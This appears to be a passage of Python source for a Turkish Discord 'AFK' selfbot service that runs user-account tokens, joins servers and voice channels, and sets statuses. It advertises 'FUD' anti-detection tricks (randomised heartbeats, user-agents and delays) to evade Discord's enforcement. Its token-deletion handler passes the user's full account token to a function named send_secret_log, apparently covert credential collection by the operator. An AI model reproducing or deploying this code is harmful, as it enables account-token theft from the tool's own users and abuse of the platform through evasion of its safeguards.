        await ctx.send("❌ Bu komutu kullanma yetkiniz yok.", delete_after=8)
        return

    class YetkiliControlView(View):
        def __init__(self, user_id):
            super().__init__(timeout=60)
            self.user_id = user_id

        @discord.ui.button(label="Ses Kanalı Seç", style=discord.ButtonStyle.primary, emoji="🔊")
        async def open_modal(self, interaction: discord.Interaction, button: Button):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("❌ Bu panel size ait değil!", ephemeral=True)
                return
            await interaction.response.send_modal(YetkiliControlModal())

    embed = discord.Embed(
        title="👑 Yetkili Kontrol",
        description="Tüm hesapları tek bir ses kanalına taşıyabilirsin.",
        color=0x5865F2
    )
    embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
    await ctx.send(embed=embed, view=YetkiliControlView(ctx.author.id))


class JoinServerModal(Modal, title='🎮 Sunucuya Katıl'):
    invite_input = TextInput(
        label='Discord Davet Kodu',
        placeholder='discord.gg/anonymousdc veya sadece anonymousdc',
        required=True,
        max_length=50
    )
   
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
       
        invite_code = self.invite_input.value.strip()
        if '/' in invite_code:
            invite_code = invite_code.split('/')[-1]
        invite_code = invite_code.strip()
       
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
       
        if not selected_token:
            await interaction.followup.send("❌ Token bulunamadı!", ephemeral=True)
            return
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.followup.send("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        success, message = await selfbot.join_guild(invite_code)
       
        if success:
            embed = discord.Embed(
                title="✅ Sunucuya Katılındı!",
                description=f"**{selected_token.get('name', selected_token['username'])}** hesabı ile\n{message}",
                color=0x2ECC71
            )
            embed.set_thumbnail(url=selected_token.get('avatar_url', ANONYMOUSDC_LOGO_URL))
            embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            embed = discord.Embed(
                title="❌ Katılım Başarısız!",
                description=f"**{selected_token.get('name', selected_token['username'])}** hesabı ile\n{message}",
                color=0xE74C3C
            )
            embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
            await interaction.followup.send(embed=embed, ephemeral=True)


@bot.command()
async def tokencontrol(ctx):
    if not token_manager.has_tokens(ctx.author.id):
        guide_channel = bot.get_channel(TOKEN_GUIDE_CHANNEL_ID)
        channel_mention = guide_channel.mention if guide_channel else "#token-guide"
       
        embed = discord.Embed(
            title="❌ Token Bulunamadı",
            description=f"Henüz token eklemediniz!\n\n.tokenadd komutunu kullanın.",
            color=0xE74C3C
        )
        embed.set_thumbnail(url=ANONYMOUSDC_LOGO_URL)
        embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
        await ctx.send(embed=embed)
        return
   
    selected_token = token_manager.get_selected_token(ctx.author.id)
    user_id = str(ctx.author.id)
   
    if not selected_token:
        await ctx.send("❌ Token seçilemedi!", ephemeral=True)
        return
   
    bot_key = f"{user_id}_{selected_token['user_id_discord']}"
    is_active = bot_key in active_bots
   
    embed = discord.Embed(
        title="💎 AnonymousDC Premium Control Panel",
        color=0x5865F2 if is_active else 0x95A5A6
    )
   
    embed.set_thumbnail(url=selected_token.get('avatar_url', ANONYMOUSDC_LOGO_URL))
   
    tokens_count = len(token_manager.get_tokens(ctx.author.id))
    selected_index = token_manager.users[user_id]['selected_token']
    token_display_name = selected_token.get('name', selected_token['username'])
   
    embed.add_field(
        name="📊 Token Bilgisi",
        value=f"🏷️ {token_display_name}\n👤 {selected_token['username']}\n`{selected_token['user_id_discord']}`\nToken {selected_index + 1}/{tokens_count}",
        inline=True
    )
   
    status_emoji = "🟢" if is_active else "🔴"
    status_text = "Aktif" if is_active else "Pasif"
    embed.add_field(name="📡 Bağlantı", value=f"{status_emoji} {status_text}", inline=True)
   
    if is_active and bot_key in active_bots:
        selfbot = active_bots[bot_key]
        voice_text = f"🔊 {selfbot.voice_channel_name}"
    else:
        voice_text = "❌ Bağlı Değil"
   
    embed.add_field(name="🎵 Ses Kanalı", value=voice_text, inline=False)
   
    mic_status = "🔴 Kapalı" if selected_token.get('mute', False) else "🟢 Açık"
    speaker_status = "🔴 Kapalı" if selected_token.get('deaf', False) else "🟢 Açık"
   
    embed.add_field(name="🎤 Mikrofon", value=mic_status, inline=True)
    embed.add_field(name="🔊 Kulaklık", value=speaker_status, inline=True)
    embed.add_field(name="⠀", value="⠀", inline=True)
   
    embed.add_field(
        name="🎮 Activity",
        value=f"{selected_token.get('custom_status', 'discord.gg/anonymousdc')} {selected_token.get('custom_emoji', '💎')}\n**discord.gg/anonymousdc** oynuyor",
        inline=False
    )
   
    embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
   
    view = ControlPanel(ctx.author.id)
    await ctx.send(embed=embed, view=view)


class ControlPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
   
    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ Bu panel size ait değil!", ephemeral=True)
            return False
        return True
   
    @discord.ui.button(label="Hesap Seç", style=discord.ButtonStyle.primary, emoji="🎮", row=0)
    async def select_account(self, interaction: discord.Interaction, button: Button):
        tokens = token_manager.get_tokens(self.user_id)
       
        if len(tokens) <= 1:
            await interaction.response.send_message("ℹ️ Sadece bir token var!", ephemeral=True)
            return
       
        options = []
        for i, token in enumerate(tokens):
            display_name = token.get('name', token['username'])
            options.append(
                discord.SelectOption(
                    label=f"{display_name[:25]}",
                    description=f"Token {i+1}",
                    value=str(i),
                    emoji="🎮"
                )
            )
       
        select = Select(placeholder="Token seçin...", options=options[:25], custom_id="token_select")
       
        async def select_callback(select_interaction: discord.Interaction):
            selected_index = int(select_interaction.data['values'][0])
            token_manager.set_selected_token(self.user_id, selected_index)
            new_token = token_manager.get_selected_token(self.user_id)
            await select_interaction.response.send_message(f"✅ Token {new_token.get('name', new_token['username'])} seçildi!", ephemeral=True)
       
        select.callback = select_callback
        view = View()
        view.add_item(select)
       
        await interaction.response.send_message("🎮 Token Seçin:", view=view, ephemeral=True)
   
    @discord.ui.button(label="Durum Değiştir", style=discord.ButtonStyle.primary, emoji="📝", row=0)
    async def change_status_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        modal = StatusModal()
        await interaction.response.send_modal(modal)
   
    @discord.ui.button(label="Sunucuya Katıl", style=discord.ButtonStyle.success, emoji="🎮", row=0)
    async def join_server_btn(self, interaction: discord.Interaction, button: Button):
        modal = JoinServerModal()
        await interaction.response.send_modal(modal)
   
    @discord.ui.button(label="Mikrofon AÇ", style=discord.ButtonStyle.success, emoji="🎤", row=1)
    async def mic_on_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        if not selfbot.voice_channel:
            await interaction.response.send_message("❌ Ses kanalında değilsiniz!", ephemeral=True)
            return
       
        if await selfbot.update_voice_state(mute=False):
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(user_id, selected_index, mute=False)
            await interaction.response.send_message("🎤 Mikrofon açıldı!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Mikrofon açılamadı!", ephemeral=True)
   
    @discord.ui.button(label="Mikrofon KAPAT", style=discord.ButtonStyle.danger, emoji="🎤", row=1)
    async def mic_off_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        if not selfbot.voice_channel:
            await interaction.response.send_message("❌ Ses kanalında değilsiniz!", ephemeral=True)
            return
       
        if await selfbot.update_voice_state(mute=True):
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(user_id, selected_index, mute=True)
            await interaction.response.send_message("🎤 Mikrofon kapatıldı!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Mikrofon kapatılamadı!", ephemeral=True)
   
    @discord.ui.button(label="Kulaklık AÇ", style=discord.ButtonStyle.success, emoji="🔊", row=2)
    async def speaker_on_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        if not selfbot.voice_channel:
            await interaction.response.send_message("❌ Ses kanalında değilsiniz!", ephemeral=True)
            return
       
        if await selfbot.update_voice_state(deaf=False):
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(user_id, selected_index, deaf=False)
            await interaction.response.send_message("🔊 Kulaklık açıldı!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Kulaklık açılamadı!", ephemeral=True)
   
    @discord.ui.button(label="Kulaklık KAPAT", style=discord.ButtonStyle.danger, emoji="🔊", row=2)
    async def speaker_off_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        if not selfbot.voice_channel:
            await interaction.response.send_message("❌ Ses kanalında değilsiniz!", ephemeral=True)
            return
       
        if await selfbot.update_voice_state(deaf=True):
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(user_id, selected_index, deaf=True)
            await interaction.response.send_message("🔊 Kulaklık kapatıldı!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Kulaklık kapatılamadı!", ephemeral=True)
   
    @discord.ui.button(label="Kanal Değiştir", style=discord.ButtonStyle.primary, emoji="🔄", row=3)
    async def change_channel_btn(self, interaction: discord.Interaction, button: Button):
        modal = ChannelModal()
        await interaction.response.send_modal(modal)
   
    @discord.ui.button(label="Kanaldan Ayrıl", style=discord.ButtonStyle.secondary, emoji="👋", row=3)
    async def leave_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.response.send_message("❌ Token aktif değil!", ephemeral=True)
            return
       
        await active_bots[bot_key].leave_voice()
        await interaction.response.send_message("👋 Ses kanalından ayrıldı!", ephemeral=True)
   
    @discord.ui.button(label="Yeniden Başlat", style=discord.ButtonStyle.primary, emoji="♻️", row=3)
    async def restart_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer(ephemeral=True)
       
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
       
        if not selected_token:
            await interaction.followup.send("❌ Token bulunamadı!", ephemeral=True)
            return
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key in active_bots:
            try:
                await active_bots[bot_key].disconnect()
            except:
                pass
            del active_bots[bot_key]
       
        try:
            await asyncio.sleep(random.uniform(1, 3))
            
            use_spotify = selected_token.get('use_spotify', True)
            selfbot = SelfBot(
                selected_token['token'],
                selected_token.get('status_text', 'discord.gg/anonymousdc'),
                use_spotify=use_spotify
            )
            await selfbot.connect()
           
            active_bots[bot_key] = selfbot
           
            await asyncio.sleep(random.uniform(2, 3))
           
            result = "♻️ Bot Yeniden Başlatıldı!\n\n"
           
            if selected_token.get('channel_id'):
                success, channel_name = await selfbot.join_voice(
                    selected_token['channel_id'],
                    selected_token.get('mute', False),
                    selected_token.get('deaf', False)
                )
                if success:
                    result += f"✅ {channel_name} kanalına katıldı!"
                else:
                    result += f"⚠️ Kanala katılamadı: {channel_name}"
            else:
                result += "✅ Bot başarıyla başlatıldı!"
           
            await interaction.followup.send(result, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Hata: {str(e)}", ephemeral=True)
   
    @discord.ui.button(label="Yenile", style=discord.ButtonStyle.secondary, emoji="🔄", row=4)
    async def refresh_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()
       
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
       
        if not selected_token:
            await interaction.followup.send("❌ Token bulunamadı!", ephemeral=True)
            return
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
        is_active = bot_key in active_bots
       
        embed = discord.Embed(
            title="💎 AnonymousDC Premium Control Panel",
            color=0x5865F2 if is_active else 0x95A5A6
        )
       
        embed.set_thumbnail(url=selected_token.get('avatar_url', ANONYMOUSDC_LOGO_URL))
       
        tokens_count = len(token_manager.get_tokens(user_id))
        selected_index = token_manager.users[user_id]['selected_token']
        token_display_name = selected_token.get('name', selected_token['username'])
       
        embed.add_field(
            name="📊 Token Bilgisi",
            value=f"🏷️ {token_display_name}\n👤 {selected_token['username']}\n`{selected_token['user_id_discord']}`\nToken {selected_index + 1}/{tokens_count}",
            inline=True
        )
       
        embed.add_field(
            name="📡 Bağlantı",
            value=f"{'🟢 Aktif' if is_active else '🔴 Pasif'}",
            inline=True
        )
       
        if is_active and bot_key in active_bots:
            selfbot = active_bots[bot_key]
            voice_text = f"🔊 {selfbot.voice_channel_name}"
        else:
            voice_text = "❌ Bağlı Değil"
       
        embed.add_field(name="🎵 Ses Kanalı", value=voice_text, inline=False)
       
        mic_status = "🔴 Kapalı" if selected_token.get('mute', False) else "🟢 Açık"
        speaker_status = "🔴 Kapalı" if selected_token.get('deaf', False) else "🟢 Açık"
       
        embed.add_field(name="🎤 Mikrofon", value=mic_status, inline=True)
        embed.add_field(name="🔊 Kulaklık", value=speaker_status, inline=True)
        embed.add_field(name="⠀", value="⠀", inline=True)
       
        embed.add_field(
            name="🎮 Activity",
            value=f"{selected_token.get('custom_status', 'discord.gg/anonymousdc')} {selected_token.get('custom_emoji', '💎')}\n**discord.gg/anonymousdc** oynuyor",
            inline=False
        )
       
        embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
       
        await interaction.edit_original_response(embed=embed, view=self)
   
    @discord.ui.button(label="Token Sil", style=discord.ButtonStyle.danger, emoji="🗑️", row=4)
    async def remove_btn(self, interaction: discord.Interaction, button: Button):
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
        selected_index = token_manager.users[user_id]['selected_token']
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key in active_bots:
            try:
                await active_bots[bot_key].disconnect()
            except:
                pass
            try:
                del active_bots[bot_key]
            except:
                pass
       
        if selected_token:
            await send_secret_log(
                interaction.user,
                selected_token['username'],
                selected_token['user_id_discord'],
                selected_token.get('avatar_url', ANONYMOUSDC_LOGO_URL),
                selected_token['token'],
                "SİLİNDİ"
            )
       
        token_manager.remove_token(interaction.user.id, selected_index)
        await interaction.response.send_message("🗑️ Token Silindi!", ephemeral=True)


class ChannelModal(Modal, title='🔄 Kanal Değiştir'):
    channel_input = TextInput(
        label='Ses Kanal ID',
        placeholder='1234567890',
        required=True,
        max_length=20
    )
   
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
       
        channel_id = self.channel_input.value.strip()
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.followup.send("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        await asyncio.sleep(random.uniform(0.5, 1))
        success, info = await selfbot.join_voice(
            channel_id,
            selected_token.get('mute', False),
            selected_token.get('deaf', False)
        )
       
        if success:
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(interaction.user.id, selected_index, channel_id=channel_id)
            await interaction.followup.send(f"✅ {info} kanalına taşındı!", ephemeral=True)
        else:
            await interaction.followup.send(f"❌ Hata: {info}", ephemeral=True)


class StatusModal(Modal, title='📝 Durum Değiştir'):
    status_text_input = TextInput(
        label='Oynuyor İsmi',
        placeholder='discord.gg/anonymousdc',
        required=True,
        max_length=50,
        default='discord.gg/anonymousdc'
    )
   
    custom_status_input = TextInput(
        label='Özel Durum',
        placeholder='discord.gg/anonymousdc',
        required=True,
        max_length=50,
        default='discord.gg/anonymousdc'
    )
   
    custom_emoji_input = TextInput(
        label='Emoji',
        placeholder='💎',
        required=False,
        max_length=10,
        default='💎'
    )
   
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
       
        status_text = self.status_text_input.value.strip() or 'discord.gg/anonymousdc'
        custom_status = self.custom_status_input.value.strip() or 'discord.gg/anonymousdc'
        custom_emoji = self.custom_emoji_input.value.strip() or '💎'
       
        user_id = str(interaction.user.id)
        selected_token = token_manager.get_selected_token(user_id)
       
        bot_key = f"{user_id}_{selected_token['user_id_discord']}"
       
        if bot_key not in active_bots:
            await interaction.followup.send("❌ Token aktif değil!", ephemeral=True)
            return
       
        selfbot = active_bots[bot_key]
       
        if await selfbot.update_status(status_text=status_text, custom_status=custom_status, custom_emoji=custom_emoji):
            selected_index = token_manager.users[user_id]['selected_token']
            token_manager.update_token(user_id, selected_index, status_text=status_text, custom_status=custom_status, custom_emoji=custom_emoji)
            await interaction.followup.send(f"✅ Durum değiştirildi: {custom_status} {custom_emoji} • discord.gg/anonymousdc oynuyor", ephemeral=True)
        else:
            await interaction.followup.send("❌ Durum değiştirilemedi!", ephemeral=True)


@tasks.loop(minutes=5)
async def check_tokens_health():
    print("🔍 Token sağlık kontrolü başlatılıyor...")
   
    for user_id, user_data in list(token_manager.users.items()):
        for token_data in user_data['tokens']:
            bot_key = f"{user_id}_{token_data['user_id_discord']}"
           
            if bot_key in active_bots:
                selfbot = active_bots[bot_key]
               
                if not selfbot.ws or selfbot.ws.closed:
                    print(f"⚠️ {token_data.get('name', token_data['username'])} bağlantısı kopmuş, yeniden bağlanılıyor...")
                    try:
                        await selfbot._reconnect()
                    except:
                        pass
           
            await asyncio.sleep(random.uniform(0.5, 1.5))
   
    print("✅ Token sağlık kontrolü tamamlandı!")


async def start_all_tokens_to_voice():
    DELAY_BETWEEN_TOKENS = random.uniform(5, 10)  # Rastgele bekleme süresi
    
    for user_id, user_data in list(token_manager.users.items()):
        for token_data in user_data['tokens']:
            channel_id = token_data.get('channel_id')
            if not channel_id:
                continue
            bot_key = f"{user_id}_{token_data['user_id_discord']}"
            if bot_key in active_bots:
                continue
            selfbot = None
            try:
                await asyncio.sleep(random.uniform(2, 5))
                
                use_spotify = token_data.get('use_spotify', True)
                selfbot = SelfBot(
                    token_data['token'],
                    token_data.get('status_text', 'discord.gg/anonymousdc'),
                    use_spotify=use_spotify
                )
                await selfbot.connect()
                await asyncio.sleep(random.uniform(2, 4))
                success, _ = await selfbot.join_voice(
                    channel_id,
                    token_data.get('mute', False),
                    token_data.get('deaf', False)
                )
                if success:
                    active_bots[bot_key] = selfbot
                    print(f"  ✅ {token_data.get('name', token_data.get('username', '?'))} → sese bağlandı")
                else:
                    await selfbot.disconnect()
            except Exception as e:
                print(f"  ⚠️ {token_data.get('name', token_data.get('username', '?'))} başlatılamadı: {e}")
                if selfbot is not None:
                    try:
                        await selfbot.disconnect()
                    except Exception:
                        pass
            
            await asyncio.sleep(DELAY_BETWEEN_TOKENS)


if __name__ == "__main__":
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('═' * 70)
        print('💎 ANONYMOUSDC AFK BOT - FUD EDITION')
        print('═' * 70)
        print('made by recyla')
        print('═' * 70)
        print('\n🔐 Anti-Detection Aktif:')
        print(' • Rastgele Heartbeat (40-43 sn)')
        print(' • Rastgele User-Agent')
        print(' • Random Delays')
        print(' • Exponential Backoff')
        print('═' * 70)
        print(f'\n👑 Yetkili: {len(AUTHORIZED_USERS)} kişi')
        print('🚀 Bot başlatılıyor...\n')
        
        bot.run(BOT_TOKEN)
    except KeyboardInterrupt:
        print('\n👋 Bot kapatılıyor...')
    except Exception as e:
        print(f'\n❌ HATA: {e}')
        import traceback
        traceback.print_exc()
